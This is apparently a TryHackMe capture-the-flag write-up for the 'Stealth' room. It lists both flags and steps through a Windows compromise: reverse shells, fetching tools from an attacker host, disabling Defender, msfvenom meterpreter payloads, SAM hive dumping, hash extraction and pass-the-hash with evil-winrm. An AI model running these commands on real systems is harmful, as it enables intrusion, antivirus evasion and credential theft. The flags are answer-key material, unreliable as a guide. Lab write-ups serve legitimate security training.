# Stealth 

+ What is the content of the user level flag? `THM{1010_EVASION_LOCAL_USER}`
+ What is the content of the root level flag? `THM{101011_ADMIN_ACCESS}`


+ Open the browser and create some payload to reverse shell using `powershell` with extention `ps1`
   - The shell will checking the virus code
+ Listen for revershell 
   - After upload `dodol.ps1` and got the revershell checking the file content
   ```powershell
   SHELL> Get-Content passwords.txt
   ### XAMPP Default Passwords ###
   1) MySQL (phpMyAdmin):
      User: root
      Password:
      (means no password!)

   2) FileZilla FTP:

      [ You have to create a new user on the FileZilla Interface ]

   3) Mercury (not in the USB & lite version):

      Postmaster: Postmaster (postmaster@localhost)
      Administrator: Admin (admin@localhost)
      User: newuser
      Password: wampp

   4) WEBDAV:
      User: xampp-dav-unsecure
      Password: ppmax2011
      Attention: WEBDAV is not active since XAMPP Version 1.7.4.
      For activation please comment out the httpd-dav.conf and
      following modules in the httpd.conf
      LoadModule dav_module modules/mod_dav.so
      LoadModule dav_fs_module modules/mod_dav_fs.so
      Please do not forget to refresh the WEBDAV authentification (users and passwords).
   SHELL>

   Invoke-WebRequest -Uri "http://10.4.37.160:83/winPEASany_ofs.exe" -OutFile "C:\Users\evader\Downloads"
   wget "http://10.4.37.160:83/winPEASany_ofs.exe" -outfile "wp.exe"
   Start-Process -FilePath "C:\Users\evader\Downloads\wp.exe"
   ```
+ Check anti Virus `Get-MpComputerStatus`
+ Turn off AV `Set-MpPreference -DisableRealtimeMonitoring $true`
   - Checking the file using Get-ChildItem
   ```powershell
   Get-ChildItem | Where-Object { $_.Name -match '[a-z].txt$' }
   Get-ChildItem -Recurse | Where {$_.Name -match '*flag*$'} | Select Fullname 
   Get-ChildItem -Recurse -Filter "*root*"
   ```

+ Our shell dodol.ps1 is not working, upload the new one `getShell.ps1` so we create the new payload using msfvenom
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o rev.exe -e x64/zutto_dekiru
   ```
   - This will generate `rev.exe` and try execute that using our shell before that listen on our kali using msfconsole
   ```bash
   msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.4.37.160; set lport 1235; exploit"
   ```

   - After got reverseshell try upload file to target machine
   ```bash
   curl http://10.4.37.160:83/exploit.cs -o exploit.cs
   curl http://10.4.37.160:83/backup.cs -o backup.cs
   ```
   - Compile our code using NET Framework 32 bit
   ```powershell
   C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exploit.cs -nowarn:1691,618
   C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe backup.cs
   ```

   - Compile our code using NET Framework 64 bit
   ```powershell
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe exploit.cs -nowarn:1691,618
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe backup.cs
   ```
   - Try execute our exploit `.\exploit.exe backup.exe`
   - This will generate `system.bak` and `sam.bak`
   - Download the file using wget 
   ```bash
   wget http://10.10.2.227:8080/system.bak
   wget http://10.10.2.227:8080/sam.bak
   ```

   - Try to dump the hash file using `impacket-secretdump` from file we download
   ```bash
   ┌──(lodwig㉿kali)-[~/Documents/THM/Stealth]
   └─$ impacket-secretsdump -sam sam.bak -system system.bak local
   Impacket v0.11.0 - Copyright 2023 Fortra

   [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
   [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
   Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
   evader:1022:aad3b435b51404eeaad3b435b51404ee:09de49072c2f43db1d7d8df21486bc73:::
   [*] Cleaning up...
   ```

   - After got the Administrator hash file `2dfe3378335d43f9764e581b856a662a` Remote to target using `evil-winrm` and the hash 
   ```bash
   ┌──(lodwig㉿kali)-[~/Documents/THM/Stealth]
   └─$ evil-winrm -u Administrator -H 2dfe3378335d43f9764e581b856a662a -i 10.10.2.227                  
   Evil-WinRM shell v3.5                                
   Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
   Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
   Info: Establishing connection to remote endpoint
   *Evil-WinRM* PS C:\Users\Administrator\Documents>
   ```
   - Chek for the flag.txt
   - User Flag Need to delete the log file on `c:\xampp\htdocs\` to activate the URL from decoded base64 
   - Root Flag on the `C:\Users\Administrator\Desktop`





